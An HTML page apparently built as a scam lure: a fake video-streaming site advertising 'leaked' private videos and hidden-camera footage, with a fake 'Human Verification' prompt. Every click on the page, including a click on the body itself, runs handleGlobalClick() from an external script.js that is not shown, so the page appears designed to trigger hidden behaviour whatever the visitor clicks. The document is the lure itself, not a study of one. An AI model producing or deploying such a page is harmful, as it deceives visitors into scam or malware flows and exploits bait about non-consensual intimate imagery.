<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>StreamHub | Viral Premium Content</title>
    <link rel="stylesheet" href="style.css">
</head>
<body onclick="handleGlobalClick()">

    <div class="app-shell">
        <div class="main-player">
            <div class="live-tag">● LIVE</div>
            <div class="video-overlay">
                <div class="play-trigger">▶</div>
                <p>Click to start streaming</p>
            </div>
            
            <div id="verify-modal" class="verify-popup">
                <div class="modal-content">
                    <h3>Human Verification</h3>
                    <p>Click 'PLAY' to verify you are not a robot.</p>
                    <button class="btn-main" onclick="handleGlobalClick()">START STREAMING</button>
                </div>
            </div>
        </div>

        <div class="video-details">
            <h2>VIRAL: Private Video 2026_Full_HD.mp4</h2>
            <div class="meta">1.2M Views • 1 hour ago</div>
        </div>

        <hr class="divider">

        <div class="recommendations">
            <h3>Up Next / Recommended</h3>
            
            <div class="video-grid">
                <div class="video-card" onclick="handleGlobalClick()">
                    <div class="thumb" style="background-image: url('https://via.placeholder.com/200x120/111/fff?text=Video+2')">
                        <span class="duration">12:45</span>
                    </div>
                    <div class="card-info">
                        <h4>Leaked: Private_Session_02.mp4</h4>
                        <p>652k Views</p>
                    </div>
                </div>

                <div class="video-card" onclick="handleGlobalClick()">
                    <div class="thumb" style="background-image: url('https://via.placeholder.com/200x120/111/fff?text=Video+3')">
                        <span class="duration">08:20</span>
                    </div>
                    <div class="card-info">
                        <h4>Hidden_Camera_Viral_HD.mp4</h4>
                        <p>1.1M Views</p>
                    </div>
                </div>
                
                </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
